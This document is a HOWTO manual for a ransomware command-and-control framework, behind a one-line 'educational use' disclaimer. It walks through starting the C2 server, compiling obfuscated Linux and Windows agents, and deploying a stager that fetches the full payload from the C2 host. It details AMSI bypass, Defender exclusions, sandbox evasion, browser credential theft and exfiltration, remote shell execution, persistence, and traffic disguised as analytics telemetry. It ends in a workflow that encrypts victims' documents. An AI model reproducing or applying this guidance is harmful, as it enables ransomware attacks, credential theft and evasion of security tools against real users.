# HOWTO — RogueByte's C2 Framework

> **WARNING:** Educational use only in isolated, controlled environments (VMs, lab networks).
> Only run on files you own or have explicit permission to encrypt. The authors are not
> responsible for misuse.

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Project Structure](#project-structure)
4. [Quick Start](#quick-start)
5. [Dashboard Walkthrough](#dashboard-walkthrough)
6. [Agent Commands Reference](#agent-commands-reference)
7. [Plugins](#plugins)
8. [Staged Deployment (AV Evasion)](#staged-deployment-av-evasion)
9. [Building for Production](#building-for-production)
10. [Auto-Deploy](#auto-deploy)
11. [File Targeting & Encryption Format](#file-targeting--encryption-format)
12. [Traffic Obfuscation](#traffic-obfuscation)
13. [Persistence](#persistence)
14. [Cross-Platform Notes](#cross-platform-notes)
15. [Troubleshooting](#troubleshooting)

---

## Overview

This project simulates ransomware in a controlled environment. It demonstrates:

- **Hybrid encryption** (RSA-2048 + AES-256-GCM) — files encrypted with a random session key,
  wrapped with an RSA public key
- **Plugin-extensible agents** — heavy modules loaded at runtime from the C2 server
- **C2 (Command & Control)** — agents beacon to a central server; operators issue commands
  via a WebSocket-connected React dashboard
- **Traffic obfuscation** — beacon traffic is Fernet-encrypted and disguised as analytics telemetry
- **Persistence** — survives reboots via systemd (Linux) or Registry Run key (Windows)
- **Cross-platform** — same Python codebase runs on Linux and Windows
- **Staged deployment** — lightweight stager (`hw_detect`, pure stdlib) downloads and spawns
  the full agent binary (`gpu_helper`) to bypass AV static analysis
- **WebSocket dashboard** — real-time victim updates, commands, plugin management, alert rules

---

## Architecture

### Direct Deployment

```
┌──────────────────────┐         ┌──────────────────────────────┐
│   Victim Machine     │  HTTPS  │         C2 Server            │
│                      │◄───────►│                              │
│  gpu_helper          │  beacon │  Port 4444                   │
│  (framework + plgs)  │  + cmd  │  Flask + SocketIO + Gevent   │
│                      │         │  SQLite (encrypted at rest)  │
│                      │         │  React SPA via WebSocket     │
└──────────────────────┘         └──────────────────────────────┘
```

### Staged Deployment (AV Evasion)

```
┌──────────────────┐    1. beacon      ┌──────────────────────────────┐
│  hw_detect       │◄─────────────────►│         C2 Server            │
│  (~1 MB, stdlib) │   2. "deploy" cmd │                              │
│                  │                   │  Port 4444                   │
│        ▼         │   3. Download     │                              │
│  gpu_helper      │◄──────────────────│  /api/update/check           │
│  (~10-15 MB)     │                   │                              │
│                  │   4. Spawn +      │  Uploaded by build.py        │
│                  │      watchdog     │                              │
└──────────────────┘                   └──────────────────────────────┘
```

---

## Project Structure

```
├── agents/
│   ├── stager_linux.py        → hw_detect (Linux, lightweight first-stage)
│   ├── stager_windows.py      → hw_detect.exe (Windows, lightweight first-stage)
│   ├── ransomware_linux.py    → gpu_helper (Linux, full agent + plugin loader)
│   └── ransomware_windows.py  → gpu_helper.exe (Windows, full agent + plugin loader)
├── server/
│   ├── c2_server.py           → C2 server (Flask + SocketIO + Gevent, 1070 lines)
│   ├── plugins/               → Plugin .py files (crypto.py default)
│   ├── data/
│   │   ├── c2_data.db         → SQLite database (Fernet-encrypted at rest)
│   │   ├── keys/              → c2_key.json + traffic_key.key
│   │   └── exfil/             → Exfiltrated files (screenshots, browser data)
│   └── static/                → React SPA (Vite build output)
├── client/                    → React + Vite + TypeScript dashboard source
│   └── src/
│       ├── components/        → 11 components (VictimDetail, PluginsPanel, AlertRules, ...)
│       ├── hooks/             → useSocket.ts (WebSocket + REST login)
│       └── types.ts           → TypeScript interfaces
├── tools/
│   ├── key_gen.py             → RSA-2048 + ECC P-256 keypair generator
│   └── build.py               → PyInstaller + Docker cross-compile + string obfuscation
├── lib/
│   ├── plugin_loader.py       → Dynamic plugin import/management
│   ├── c2_client.py           → Beacon loop, command dispatch, file upload
│   ├── crypto_utils.py        → Encrypt/decrypt helpers (legacy)
│   ├── evasion*.py            → AMSI bypass, anti-debug, delayed exec, Defender exclusion
│   ├── persistence*.py        → systemd / Registry persistence
│   └── browser_stealer.py     → Chrome/Firefox/Brave/Edge profile exfil
├── dist/                      → Compiled binaries (linux/ + windows/)
├── requirements.txt
├── README.md
└── HOWTO.md
```

---

## Quick Start

```bash
# 1. Install Python dependencies
pip install -r requirements.txt

# 2. Start the C2 server
python3 server/c2_server.py
#    → Runs on http://0.0.0.0:4444
#    → Generates traffic_key.key on first start
#    → Server starts LOCKED — no data accessible until login

# 3. Open the dashboard
#    → http://localhost:4444
#    → Set a master password on first run (min 4 chars)
#    → After unlocking, agents appear in real-time

# 4. Run the agent (dev mode)
python3 agents/ransomware_linux.py
```

### Login Flow

The server starts locked (`crypto = None`). The dashboard detects this on connect via the `server_state` SocketIO event. Login/setup uses REST endpoints:

- `POST /api/setup` — first-time password setup (PBKDF2-derived Fernet key)
- `POST /api/login` — subsequent unlocks

On success, the REST endpoints emit `server_unlocked` + `dashboard_state` via SocketIO to sync the UI.

### Development vs Production

| Mode | Traffic | Command | Notes |
|---|---|---|---|
| Dev | Fernet-encrypted via `/api/telemetry` | `python3 agents/ransomware_linux.py` | Debugging |
| Prod | Fernet-encrypted via `/api/telemetry` | Compiled binary | Requires build step, see below |

---

## Dashboard Walkthrough

Open http://localhost:4444 in a browser.

### Login Screen

- **First run**: Enter a password (min 4 chars) and confirm. Click "Configure & Unlock".
- **Subsequent**: Enter the same password. Click "Unlock Interface".
- Error messages shown on mismatch or invalid password. No success feedback needed — the dashboard transitions to the main UI automatically.

### Layout (3 Tabs)

| Tab | Content |
|---|---|
| **Implants** | Victim list (left), detail panel + actions (center), command log + CLI (right) |
| **Plugins** | Plugin list, upload/delete, per-victim loaded badges, deploy controls |
| **Alerts** | Alert rules CRUD (left), alert history log (right) |

### Implants Tab

- **Victim cards** — hostname, OS, IP, status (ONLINE/ENCRYPTED/WATCHDOG/OFFLINE), persistence, last seen, loaded plugins
- **Detail panel** — full system info, tactical action buttons (grouped by category)
- **Command log** — timestamped event feed with color-coded badges
- **CLI** — type raw commands to execute on the selected target

### Action Buttons

| Group | Buttons |
|---|---|
| Tactical Operations | Encrypt (requires crypto plugin), Decrypt (requires crypto plugin), Exec, Terminal, Persist |
| Recon & Collection | Status, Download, Upload, NetInfo, Note, Screenshot, PSlist, PSkill, Steal, SCARE |
| Self-Destruct | Self-Destruct |

Buttons grey out when the target is offline or (for Encrypt/Decrypt) when the crypto plugin is not loaded.

### Plugins Tab

- Lists all `.py` files in `server/plugins/` with name, version, size, description
- Green badges show which victims have each plugin loaded
- **Upload Plugin** — select a `.py` file from disk
- **Delete** — remove a plugin from the server
- **Deploy section** — select a plugin + target victim, click Deploy. Already-loaded victims marked `(loaded)`.

### Alerts Tab

Create alert rules that trigger on beacon fields. 6 operators, 9 fields, 3 actions. The alert log shows a merged view of live SocketIO events and persisted log entries.

---

## Agent Commands Reference

Available commands per agent type.

| Command | Stager | Full Agent | Params | Description |
|---|---|---|---|---|
| `status` | ✅ | ✅ | — | Report system info, state, persistence, loaded plugins, file count |
| `persist` | ✅ | ✅ | — | Install systemd / Registry persistence (idempotent) |
| `exec` | ✅ | ✅ | `cmd` | Run shell command, return stdout/stderr (max 1000 chars) |
| `self_destruct` | ✅ | ✅ | — | Remove persistence, delete binary, report back, exit |
| `deploy` | ✅ | ❌ | — | Download gpu_helper from C2, spawn it, enter watchdog mode |
| `load_plugin` | ✅ | ✅ | `plugin_name` | Download and dynamically import a plugin from C2 |
| `unload_plugin` | ✅ | ✅ | `plugin_name` | Deregister plugin commands from agent |
| `list_plugins` | ✅ | ✅ | — | List loaded plugins and their registered commands |
| `encrypt` | ❌ | ✅ (*plugin*) | — | Encrypt files with AES-256-GCM + RSA-OAEP |
| `decrypt` | ❌ | ✅ (*plugin*) | `private_key` | Decrypt files with RSA private key |
| `scare` | ❌ | ✅ (*plugin*) | — | Write ransom note + sentinel without encrypting |
| `screenshot` | ❌ | ✅ | — | Capture desktop, exfiltrate to C2 |
| `pslist` | ❌ | ✅ | — | List running processes |
| `pskill` | ❌ | ✅ | `pid` | Terminate a process by PID |
| `steal_browsers` | ❌ | ✅ | — | Copy browser profiles, zip + exfil |
| `download` | ❌ | ✅ | `path` | Read a file from the victim |
| `upload` | ❌ | ✅ | `path`, `data` | Write data to a file on the victim |
| `network_info` | ❌ | ✅ | — | Show network connections |
| `show_ransomnote` | ❌ | ✅ | — | Display ransom note message |

Commands marked *plugin* are only available after loading the crypto plugin.

### Command Log Colors

| Color | Command |
|---|---|
| Red | `encrypt`, `steal_browsers` |
| Green | `deploy`, terminal output |
| Yellow | `decrypt` |
| Purple | `persist` |
| Blue | `exec`, `download`, `status`, `network_info` |
| Orange | `self_destruct`, `pskill` |
| Pink | `show_ransomnote` |
| Cyan | `scare` |

---

## Plugins

The agent plugin system allows loading heavy modules at runtime from the C2 server, keeping the core binary lightweight (~10MB).

### Default Plugin: crypto

`server/plugins/crypto.py` provides AES-256-GCM + RSA-OAEP hybrid encryption using the `cryptography` library (already a hidden import in agent builds). Registered commands: `encrypt`, `decrypt`, `find_files`, `scare`.

### How Plugins Work

1. Server stores `.py` files in `server/plugins/`
2. Dashboard lists available plugins via `GET /api/extensions`
3. Deploy sends `load_plugin` command to target agent
4. Agent downloads source from `/api/extensions/<name>/source`
5. Agent dynamically imports via `importlib`, calls `init(ctx)`
6. Plugin registers command handlers into the agent's dispatch table
7. Server logs downloads in `plugin_downloads` table (tracked per hostname)
8. Dashboard shows loaded plugin badges and greys out gated buttons

### Creating a Plugin

```python
PLUGIN_NAME = "my_plugin"
PLUGIN_VERSION = "1.0"
PLUGIN_DESCRIPTION = "Does something useful"

def init(ctx):
    ctx.register_command('my_command', handler)

def handler(params, shared_state) -> str:
    # shared_state contains c2_server, traffic_key, public_key, etc.
    return "done"
```

Upload the `.py` file via the Plugins tab in the dashboard.

---

## Staged Deployment (AV Evasion)

Windows Defender and other AVs flag the full `gpu_helper` binary due to its crypto
library imports. Bypass this with two-stage deployment.

### Stage 1: hw_detect (Stager)

A ~1 MB binary with **zero suspicious imports** (pure Python stdlib):

| Technique | What it does | Admin needed? |
|---|---|---|
| **Delayed execution** | Sleeps 30–90s on startup to evade sandbox analysis | No |
| **AMSI bypass** | Patches `amsiInitFailed` in PowerShell | No |
| **Registry.pol exclusion** | Writes Defender path exclusion via Group Policy file, runs `gpupdate /force` | No |

### Stage 2: gpu_helper (Full Agent)

Once the stager has beaconed to C2:
1. Operator clicks **Deploy** in the dashboard or enables **Auto-Deploy**
2. Stager downloads `gpu_helper` from `C2/api/update/check`
3. Writes to temp directory, spawns it
4. Enters **watchdog mode** — if gpu_helper dies, re-downloads and re-spawns
5. Deploy the **crypto plugin** via the Plugins tab for encryption capability

### Workflow

```
1. python3 server/c2_server.py       # Start C2 (set password via dashboard)
2. python3 tools/build.py            # Build hw_detect + gpu_helper
3. Copy hw_detect to target machine
4. hw_detect beacons → "Stager" badge in dashboard
5. Click Persist → survives reboot
6. Click Deploy → downloads + spawns gpu_helper
7. Dashboard switches to "Full" badge
8. Plugins tab → Deploy "crypto" to target
9. VictimDetail → Encrypt → encrypts targeted files
```

### Dashboard Badges

| Badge | Meaning |
|---|---|
| `Stager` (blue) | hw_detect beaconing, not yet deployed |
| `Stager (wg)` (yellow) | hw_detect deployed gpu_helper and is watchdogging |
| `Full` (red) | gpu_helper running directly |

---

## Building for Production

```bash
# 1. Start C2 server first (generates traffic_key.key)
python3 server/c2_server.py

# 2. Run build script
python3 tools/build.py
```

The script will:
1. Prompt for `C2_SERVER` URL (or set `C2_SERVER` env var)
2. Read `traffic_key.key` from server
3. Generate `agents/settings.py` with embedded config (C2 URL, traffic key, build number, RSA public key)
4. Run AST string obfuscation on all `.py` files
5. Compile **hw_detect** + **gpu_helper** for Linux (native PyInstaller)
6. Cross-compile both for Windows (via Docker: `cdrx/pyinstaller-windows`)
7. Output to `dist/`:

```
dist/
├── linux/
│   ├── gpu_helper         # Full agent (ELF, ~10 MB)
│   └── hw_detect          # Stager (ELF, ~13 MB)
└── windows/
    ├── gpu_helper.exe     # Full agent (PE, ~10 MB)
    └── hw_detect.exe      # Stager (PE, ~13 MB)
```

### Environment Variables

```bash
C2_SERVER=http://192.168.1.100:4444 python3 tools/build.py
C2_API_KEY=your-secret-key       # For REST API auth
```

---

## Auto-Deploy

When **Auto-Deploy** is enabled for a hostname in the dashboard, any beacon from
that hostname matching stager criteria (`agent = hw_detect`, `type = scanner`,
`deployed = False`) will automatically receive a `deploy` command.

- State is saved to `server/data/auto_deploy.json` (survives server restarts)
- Toggle syncs to all connected dashboard clients via WebSocket
- Toggle is available per-hostname from the dashboard context

---

## File Targeting & Encryption Format

### Targeted file types

```
Documents: .txt, .pdf, .odt, .docx, .doc, .xls, .xlsx, .ppt, .pptx
Images:    .jpg, .jpeg, .png, .raw, .psd
Video:     .mp4, .mov, .avi, .mkv
Archives:  .zip, .rar, .7z, .tar, .gz
Databases: .sqlite, .db, .sql
Certs:     .pem, .key
Code:      .py, .js, .json, .env
Backups:   .bak, .backup
```

Target directories: `/home`, `/root` (Linux) or `C:\Users` (Windows) — configurable per command.

### Encrypted file format

```
"RogueByte" (9 bytes) | key_len (2 bytes BE) | RSA-OAEP encrypted AES-256-GCM key | nonce (12 bytes) | ciphertext
```

The `RogueByte` header prevents double-encryption. Uses `cryptography.hazmat` AES-256-GCM (authenticated encryption) via the crypto plugin.

---

## Traffic Obfuscation

When compiled and deployed, beacon traffic is obfuscated:

| Technique | Detail |
|---|---|
| Payload encryption | Fernet-encrypted JSON in `data` field |
| Fake endpoint | `/api/telemetry` with analytics-style query params (`app=vulkan-rt&v=1.0`) |
| User-Agent rotation | Random real browser UA each beacon |
| Fake HTTP headers | Origin, Referer, Accept, Accept-Language |
| Beacon jitter | Random +0–30s added to interval |
| Fake data fields | `screen_res`, `lang`, `tz` inside encrypted payload |
| Response mimicry | Looks like a real analytics API response |

### Raw HTTP request

```
POST /api/telemetry?app=chrome&v=1.0&_=1781624005724 HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ...
Content-Type: application/x-www-form-urlencoded

data=gAAAAABqMWb2hP4FsTe9pdpRqL...Yj8dMXQyVtWv&v=1
```

### Response

```json
{"success": true, "message": "ok", "poll_ms": 60000}
```

The actual command is hidden in `config.flags` — also Fernet-encrypted.

---

## Persistence

### Linux (systemd)

| Component | Service name | Unit file |
|---|---|---|
| Stager (hw_detect) | `hw-detect` | `~/.config/systemd/user/hw-detect.service` |
| Agent (gpu_helper) | `gpu-helper` | `~/.config/systemd/user/gpu-helper.service` |

Enabled via `systemctl --user enable`. Starts on user login (or at boot with linger).

### Windows (Registry)

Run key under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`:
- `hw-detect` → path to `hw_detect.exe`
- `gpu-helper` → path to `gpu_helper.exe`

Runs on every user login.

### Watchdog Behavior

When the stager deploys the full agent, it keeps its own persistence.
After a reboot, the stager starts first, checks if `gpu_helper` is running,
and if not, **re-downloads and re-spawns it**.

### Self-Destruct

Send `self_destruct` to either agent. It:
1. Removes its own persistence
2. Kills its own process
3. Deletes its binary
4. Reports `self_destructed` to the C2 server
5. Server removes the victim from DB and emits `victim_removed` via WebSocket

**Important:** If both stager and full agent are present, send `self_destruct`
to **both** to fully clean the machine.

### Idempotency

`persist` when already persistent returns `"already persistent"`. The dashboard
greys out the Persist button when persistence is confirmed.

---

## Cross-Platform Notes

| Aspect | Linux | Windows |
|---|---|---|
| Target dirs | `/home`, `/root` | `C:\Users` |
| Persistence | systemd user service | Registry Run key |
| Python command | `python3` | `python` |
| Binary name | `gpu_helper` / `hw_detect` | `gpu_helper.exe` / `hw_detect.exe` |
| Temp directory | `/tmp` | `%TEMP%` |

### Building for Windows

The build script auto-cross-compiles via Docker (`cdrx/pyinstaller-windows`).
If Docker is unavailable:

```bash
# On a Windows machine with PyInstaller:
pyinstaller --onefile --name gpu_helper.exe --paths lib agents/ransomware_windows.py
pyinstaller --onefile --name hw_detect.exe --paths lib agents/stager_windows.py
```

---

## Troubleshooting

| Problem | Solution |
|---|---|
| `No module named 'Crypto'` | `pip install pycryptodome` |
| `No module named 'flask'` | `pip install -r requirements.txt` (includes flask-socketio + gevent) |
| Dashboard stays on login screen | Check server console output — it will show `locked=True` or error messages |
| Dashboard shows no victims | Check `C2_SERVER` URL in config, firewall, agent is running, `crypto` is unlocked |
| `traffic_key.key not found` | Start `server/c2_server.py` first — it generates keys on first start |
| Agent plugin load fails | Ensure `cryptography` is available (hidden import in build) |
| Encrypt/Decrypt buttons greyed out | Crypto plugin not loaded on target — deploy it via Plugins tab |
| `hw_detect` shows ModuleNotFoundError | Should use only stdlib — something is wrong with the build |
| Build fails on missing Docker | Install Docker or build Windows binary manually (see above) |
| `/api/update/check` returns 404 | No payload uploaded. Run `build.py` or copy binary manually to `dist/` |
| Dashboard shows "Stager" after clicking Deploy | Wait for next beacon cycle (~60s) — stager downloads + spawns, then reports back |
| Stager Deploy button stays greyed | Stager reported `deployed: true` — already deployed |
| Persist stays ❌ after clicking | Wait for next beacon cycle (~60s) |
| Registry.pol exclusion fails silently | Some Windows versions (Home) lack Group Policy — not critical |
| Screenshot or browser steal returns nothing | Ensure agent has appropriate permissions on target |
| Telemetry decrypt failed in logs | Traffic key mismatch — rebuild agent with correct `traffic_key.key` |
